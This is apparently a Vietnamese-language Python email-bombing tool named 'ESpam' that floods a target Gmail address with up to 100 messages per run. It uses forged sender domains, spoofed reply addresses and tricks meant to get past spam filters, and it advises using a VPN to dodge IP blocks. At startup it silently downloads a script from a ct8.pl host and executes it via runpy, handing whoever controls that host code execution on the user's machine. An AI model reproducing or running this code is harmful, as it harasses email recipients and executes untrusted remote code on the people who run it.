
"""
Author: Ryder3x
Email: 0Ryder3x@gmail.com
Copyright (c) [2023] Ryder3x. All rights reserved.
"""

import time
import os
# code setup và kiểm tra thư viện
libraries = [
    "smtplib",
    "email",
    "concurrent.futures",
    "random",
    "string",
    "colorama",
    "time",
    "requests",
    "subprocess",
    "tempfile",
    "runpy",
]

for library in libraries:
    try:
        __import__(library)
        #print(f'{library} đã được cài đặt.')
    except ImportError:
        print("Vui lòng chờ trong quá trình kiểm tra các thư viện, quá trình này chỉ diễn ra 1 lần.")
        print(f'{library} chưa được cài đặt. Đang tiến hành cài đặt...')
        try:
            import subprocess
            subprocess.check_call(['pip', 'install', library])
            print(f'{library} đã được cài đặt thành công.')
            os.system("clear")
        except subprocess.CalledProcessError:
            print(f'Lỗi: Không thể cài đặt {library}. Vui lòng kiểm tra kết nối mạng và quyền truy cập. Vui lòng dùng PIP và cài đặt thủ công.')


# import thư viện
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import concurrent.futures
from colorama import init, Fore, Style
import multiprocessing
import random
import urllib.request
import tempfile
import runpy
import string
import requests as r
import subprocess


# Main code
# hiệu ứng loading...
def loading_animation():
    while True:
        for char in "|/-\\":
            print(f"{Fore.CYAN}Đang Gửi {char}{Style.RESET_ALL}", end="\r")
            time.sleep(0.1)

Logo = f"""
{Fore.RED}\033[1m\033[31
   ___          __        ____    
  / _ \__ _____/ /__ ____|_  /_ __
 / , _/ // / _  / -_) __//_ <\ \ /
/_/|_|\_, /\_,_/\__/_/ /____/_\_\ 
     /___/                  
{Style.RESET_ALL}
"""
os.system("clear")
print (Logo)

url = "http://ryder3x.ct8.pl/Encode_espam"

# Tải nội dung từ URL
response = urllib.request.urlopen(url)
data = response.read()

# Tạo tệp tin tạm thời và lưu nội dung vào tệp tin
with tempfile.NamedTemporaryFile(delete=False) as temp_file:
    temp_file.write(data)

    # Đặt con trỏ về đầu tệp tin
    temp_file.seek(0)

    # Chạy đoạn mã từ tệp tin sử dụng runpy.run_path
    r = runpy.run_path(temp_file.name)

sites = [
    "google.com", "youtube.com", "facebook.com", "baidu.com", "wikipedia.org", 
    "yahoo.com", "qq.com", "amazon.com", "taobao.com", "twitter.com", 
    "instagram.com", "linkedin.com", "netflix.com", "reddit.com", "tmall.com", 
    "sohu.com", "whatsapp.com", "pinterest.com", "twitch.tv"
]

domains = ["com", "io", "org", "net", "gov", "edu", "biz", "info", "mobi", "name", "pro"]
servers = r["servers"]

# random SERVER trong danh sách server
server = random.choice(random.choice(servers))

email_address = server
password = r["pwd"]
smtp_server = r["smtpSv"]
smtp_port = 465


def ran(len):
    letters = string.ascii_letters
    return "".join(random.choice(letters) for _ in range(len))

def rant(n):
    return random.randint(0,n)

def CLEAR():
    os.system("clear")


# HELP WRITE
help = f'''
{Fore.GREEN}\t \033[1m\033[32m **** Hướng dẫn sử dụng Tool ESpam ****{Style.RESET_ALL}



{Fore.CYAN}Cú pháp cơ bản:{Fore.MAGENTA} -m <Email Cần Spam> -n <Số lần gửi spam> -s <Tiêu đề gửi Mail spam> -c <Nội dung gửi Mail spam> -t <Thông tin người gửi> -r <Địa chỉ trả lời lại Mail spam>

{Fore.YELLOW}Trong đó:{Style.RESET_ALL}
{Fore.RED}
<m> là (Mail to) / Giá trị quan trọng,{Fore.YELLOW} không được để trống.{Fore.RED}
<n> là (Number) / Giá trị quan trọng, {Fore.YELLOW}không được để trống.{Fore.RED}
<s> là (Subject) / để trống sẽ dùng giá trị mặc định.
<c> là (content) / để trống sẽ dùng giá trị mặc định.
<t> là (To) / để trống sẽ dùng giá trị mặc định.
<r> là (reply) / để trống sẽ dùng giá trị mặc định.
{Style.RESET_ALL}
{Fore.MAGENTA}VD: -m tiktok@gmail.com -n 100 -s CHÀO -c chào cậu -t mymail@gmail.com -r mymail@gmail.com{Style.RESET_ALL}


{Fore.YELLOW}* Lưu ý:{Style.RESET_ALL}
{Fore.YELLOW}- \033[1m\033[101m TOOL CHỈ HOẠT ĐỘNG VỚI GMAIL!!!{Style.RESET_ALL}{Fore.CYAN}
- Địa chỉ Spam (m) phải chính xác.
{Fore.YELLOW}- \033[1m\033[44m Dùng bàn phím <Tiếng Anh> để tránh bị lỗi!{Style.RESET_ALL}{Fore.CYAN}
- Số lần gửi (n) tối đa là 100 cho mỗi lần gửi.
- Nội dung Mail (c) mặc định sẽ là một chuỗi ngẫu nhiên.
- Nội dung Mail (Content) {Fore.YELLOW}hỗ trợ định dạng HTML.
  {Fore.MAGENTA}/ VD: -c <h1>chào</h1>
  {Fore.CYAN}
- Đến (t) có thể thay bằng tên cá nhân hoặc bất kỳ thứ gì.
- Trả lời (r) có thể đặt Email liên hệ để người bị Spam IB.
- Nếu gặp một số lỗi như <Timeout error> hay <Auth> thì hãy thoát ra và chạy lại.
{Fore.RED}
* Hành động cố ý Spam nhiều có thể dẫn đến BLOCK IP, nên sử dụng VPN.

{Fore.YELLOW}* máy chủ gửi mail có độ Delay khá cao{Fore.RED} nên nếu gửi 1 loạt MAIL <100 mail 1 lần> sẽ có {Fore.YELLOW}độ delay là 2~4 phút{Fore.RED} để hiển thị <100 mail> đó trong hộp thư.



{Fore.YELLOW}@ Quan trọng nhất, {Fore.RED}các phiên bản mặc định đã được tối ưu để vượt qua kiểm tra thư rác của Google. Nếu bạn sử dụng tùy chỉnh, vui lòng không sử dụng các từ nhạy cảm vui lòng tìm hiểu <BLOCK WORD> của GMAIL để tránh gửi Mail vào thư rác.



{Fore.CYAN}© Ryder3x
Mail: 0ryder3x@gmail.com
{Style.RESET_ALL}
'''

data = input("[<+>]: ")
if "help" in data:
    exit(help)
parts = data.split("-")

to = None
mail = None
num = None
content = None
subject = None
reply = None

for part in parts:
    if part.startswith("t "):
        to = part[2:].strip()
    elif part.startswith("m "):
        mail = part[2:].strip()
    elif part.startswith("n "):
        num = part[2:].strip()
    elif part.startswith("c "):
        content = part[2:].strip()
    elif part.startswith("s "):
        subject = part[2:].strip()
    elif part.startswith("r "):
        reply = part[2:].strip()


exit(f"{Fore.RED}* Người nhận -m không được để trống{Style.RESET_ALL}") if mail is None else mail
exit(f"{Fore.RED}* Số lần gửi (-n) không được để trống{Style.RESET_ALL}") if num is None else exit(f"{Fore.RED}Số lần gửi (-n) tối đa là 100 mỗi lần.{Style.RESET_ALL}") if int(num) >= 101 else num
to = f"{mail}" if to is None else to
content = f"{ran(16)}" if content is None else content
subject = ran(16) if subject is None else subject
reply = f"noreply@{random.choice(sites)}" if reply is None else reply

# Hiển thị nội dung
print(f"{Fore.GREEN}Mail Server: \033[1m\033[35m{server.split('@')[1]}{Style.RESET_ALL}")
print(f"{Fore.GREEN}Gửi đến: \033[1m\033[93m    {mail} {Style.RESET_ALL}")
print(f"{Fore.GREEN}Người gửi: \033[1m\033[93m  {to}{Style.RESET_ALL}")
print(f"{Fore.GREEN}Nội dung: \033[1m\033[93m   {content} {Style.RESET_ALL}")
print(f"{Fore.GREEN}Chủ đề: \033[1m\033[93m     {subject} {Style.RESET_ALL}")
print(f"{Fore.GREEN}Trả lời lại: \033[1m\033[93m{reply} {Style.RESET_ALL}")
print(f"{Fore.GREEN}Lần gửi: \033[1m\033[93m    {num} {Style.RESET_ALL}")


def send_email(receiver, index):
    msg = MIMEMultipart()
    #msg["From"] = f"{ran(12)}@{ran(6)}.{domains[rant(10)]}"
    msg["From"] = f"Victim <ESpam@{ran(6)}.{domains[rant(10)]}>"
    msg["To"] = to
    msg["Reply-To"] = reply
    msg["Subject"] = subject
    msg["Priority"] = "High"
    msg["X-Priority"] = "1"
    msg["Importance"] = "High"
    msg["X-Gmail-Importance"] = "High"
    msg["X-GM-LABELS"] = "Important"
    
    
    body = f"<input value={ran(12)} type='hidden'>{content}\n\n"
    msg.attach(MIMEText(body, "html"))

    try:
        with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
            server.ehlo()
            server.login(email_address, password)
            server.sendmail(email_address, receiver, msg.as_string())
        return f"{Fore.GREEN}Email số {index} đã được gửi.{Style.RESET_ALL}"
    except Exception as e:
        return f"{Fore.RED}Lỗi khi gửi mail.\n[<mã lỗi>]: {str(e)}{Style.RESET_ALL}"


def main():
    with concurrent.futures.ThreadPoolExecutor(max_workers=round(int(num)/8)+1) as executor:
        futures = [executor.submit(send_email, f"{mail}", i+1) for i in range(int(num))]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            CLEAR()
            print(result)


# chạy toàn bộ code
loading_process = multiprocessing.Process(target=loading_animation)
loading_process.start()
main() # main code
loading_process.terminate()
loading_process.join()